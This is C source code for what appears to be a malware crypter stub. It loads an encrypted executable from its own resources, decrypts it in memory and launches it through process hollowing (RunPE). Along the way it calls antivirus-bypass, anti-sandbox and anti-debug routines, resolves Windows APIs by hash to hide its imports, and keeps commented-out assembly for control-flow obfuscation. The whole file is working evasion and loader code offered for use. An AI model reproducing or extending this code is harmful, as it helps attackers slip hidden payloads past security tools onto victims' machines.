#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>

#include "runpe.h"
#include "crypt.h"
#include "define.h"
#include "antiemul.h"
#include "noimport.h"


void StubEntry(void);
void * LoadFromResources(LPSTR szModulePath, int ResId, DWORD *dwSize);
typedef DWORD (*TD_NetValidateName) (LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD);


int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	/*HANDLE NetApi32 = LoadLibraryW(L"netapi32.dll");
	__asm mov eax, eax;
	__asm mov eax, eax;
	TD_NetValidateName NetValidateName = (TD_NetValidateName)GetProcAddress(NetApi32, "NetValidateName");
	__asm nop;
	__asm nop;
	DWORD Result = NetValidateName(L"123", L"", L"", L"", 1) - (0x00000035 + 0x000000CB); 
	__asm
	{
		call dword ptr ds:[GetLastError]
		test eax, eax
		add eax, offset StubEntry
		mov eax, eax
		add eax, Result
		call eax
	}*/
	StubEntry();
}

void StubEntry(void)
{
	LPBYTE lpImage = NULL;
	DWORD dwImageSize = 0;
    char szFilePath[MAX_PATH];

	BypassAV();
	AntiSandbox();
	CallAPI(dwCreateThread, 6, NULL, 0, AntiDebug, NULL, 0, NULL);

	CallAPI(dwGetModuleFileNameA, 3, 0, szFilePath, MAX_PATH);

	lpImage = LoadFromResources(szFilePath, 100, &dwImageSize);

	/* Decrypt PE-image in memory and run */
	if (lpImage)
	{
		DecryptImage(lpImage, dwImageSize);
		RunPE(szFilePath, lpImage);
	}
}

void * LoadFromResources(LPSTR szModulePath, int ResId, DWORD *dwSize)
{
	HMODULE hLibrary;
	HRSRC hResource;
	HGLOBAL hResourceLoaded;
	LPBYTE lpBuffer;
	LPVOID lpImage = NULL;
	DWORD dwImageSize = 0;

	BypassAV();

	hLibrary = (HMODULE) CallAPI(dwLoadLibraryA, 1, szModulePath);
	if (NULL != hLibrary)
	{
    	hResource = (HRSRC) CallAPI(dwFindResourceA, 3, hLibrary, MAKEINTRESOURCE(ResId), RT_RCDATA);
    	if (NULL != hResource)
    	{
        	hResourceLoaded = (HGLOBAL) CallAPI(dwLoadResource, 2, hLibrary, hResource);
        	if (NULL != hResourceLoaded)
        	{
            	lpBuffer = (LPBYTE) CallAPI(dwLockResource, 1, hResourceLoaded);            
            	if (NULL != lpBuffer)            
            	{                
                	dwImageSize = CallAPI(dwSizeofResource, 2, hLibrary, hResource);
					lpImage = (LPVOID) CallAPI(dwVirtualAlloc, 4, NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
					MemCpy(lpImage, lpBuffer, dwImageSize);
					*dwSize = dwImageSize;

					CallAPI(dwFreeLibrary, 1, hLibrary);
					return lpImage;            
            	}
        	}    
    	}

    	CallAPI(dwFreeLibrary, 1, hLibrary);
	}
	return NULL;
}
